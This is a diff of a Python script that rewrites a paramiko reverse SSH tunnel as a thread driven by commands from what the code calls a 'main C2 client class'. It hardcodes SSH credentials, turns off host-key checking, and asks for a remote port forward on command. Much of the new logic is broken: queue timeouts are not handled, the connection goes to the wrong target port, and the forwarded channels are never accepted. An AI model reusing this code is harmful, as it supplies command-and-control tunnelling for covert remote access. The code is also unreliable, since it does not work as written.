@@ -4,94 +4,83 @@ import threading
 import socket
 import subprocess
 import select
+from queue import Queue
 
 closeTunnel = False
 
-def tunnel_handler(channel, host, port):
-    sock = socket.socket()
 
-    try:
-        sock.connect((host, port))
-        print("Connected!")
+class ClientThread(threading.Thread):
+    def __init__(self, commands):
+        # `commands` is a Queue of commands from the main C2 client class
+        super(ClientThread, self).__init__()
+        self.commands = commands
 
-        while closeTunnel is not True:
-            r, w, x = select.select([sock, channel], [], [])
+        self.REMOTE_HOST = "localhost"
+        self.REMOTE_PORT = 22
+        self.USERNAME = "test_ssh_user"
+        self.PASSWORD = "somePa55word"
 
-            if sock in r:
-                data = sock.recv(1024)
+        self.stop_request = threading.Event()
 
-                if len(data) == 0:
-                    break
+        self.client = paramiko.SSHClient()
+        self.client.load_system_host_keys()
+        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
-                channel.send(data)
+    def run(self):
+        self.client.connect(self.REMOTE_HOST, self.REMOTE_PORT,
+                            username=self.USERNAME, password=self.PASSWORD)
+        chan = self.client.get_transport().open_session()
 
-            if channel in r:
-                data = channel.recv(1024)
+        while not self.stop_request.is_set():
+            command = self.commands.get(True, 0.05)
 
-                if len(data) == 0:
-                    break
-                
-                sock.send(data)
-            
-        channel.close()
-        sock.close()
-        print("Tunnel Closed")
+            if command == "OPEN_TUNNEL":
+                forwardFromPort = self.commands.get(True, 0.05)
+                self._tunnel_handler(chan, self.REMOTE_HOST, self.REMOTE_PORT,
+                                self.client.get_transport(), forwardFromPort)
 
-
-    # User has exited their PTY shell
-    except OSError as e:
-        print("User exited")
-            
-        channel.close()
-        sock.close()
-        print("Tunnel Closed")
-
-    except Exception as e:
-        print("Failed to establish tunnel!")
-
-
-def establish_reverse_tunnel(forwardToHostPort, forwardFromPort, transport):
-    """ Sets up a reverse tunnel, such that traffic on the server's port `forwardFromPort` is forwarded via SSH to `forwardToHostPort`
-    """
-    transport.request_port_forward("", forwardFromPort)
-
-    while closeTunnel is not True:
-        channel = transport.accept(1000)
-
-        if channel is None:
-            continue
-        
-        thread = threading.Thread(target=tunnel_handler, args=(channel, forwardToHostPort[0], forwardToHostPort[1]))
-        thread.setDaemon(True)
-        thread.start()
-
-
-def main():
-    if len(sys.argv) < 5:
-        print("Too few arguments!")
-
-    else:
-        hostname = sys.argv[1]
-        username = sys.argv[2]
-        password = sys.argv[3]
-        port = sys.argv[4]
-        remoteForwardPort = 9090
-        localSSHPort = 2222
+    def _tunnel_handler(self, channel, host, port, transport, forwardFromPort):
+        sock = socket.socket()
+        closeTunnel = False
+        transport.request_port_forward("", forwardFromPort)
 
         try:
-            client = paramiko.SSHClient()
-            client.load_system_host_keys()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-            client.connect(hostname, port, username=username, password=password)
-            chan = client.get_transport().open_session()
-            command = ""
+            sock.connect((host, port))
+            print("Connected!")
 
-            print("Awaiting data")
+            while closeTunnel is not True:
 
-            establish_reverse_tunnel(("localhost", localSSHPort), remoteForwardPort, client.get_transport())  
-        finally:
-            client.close()
+                r, w, x = select.select([sock, channel], [], [])
 
-if __name__ == "__main__":
-    main()
+                if sock in r:
+                    data = sock.recv(1024)
 
+                    if len(data) == 0:
+                        break
+
+                    channel.send(data)
+
+                if channel in r:
+                    data = channel.recv(1024)
+
+                    if len(data) == 0:
+                        break
+
+                    sock.send(data)
+
+                closeTunnel = (self.commands.get(True, 0.05) == "CLOSE_TUNNEL")
+
+            channel.close()
+            sock.close()
+            print("Tunnel Closed")
+
+        # User has exited their PTY shell
+        except OSError as e:
+            print("User exited")
+
+            channel.close()
+            sock.close()
+            print("Tunnel Closed")
+
+        except Exception as e:
+            print("Failed to establish tunnel!")
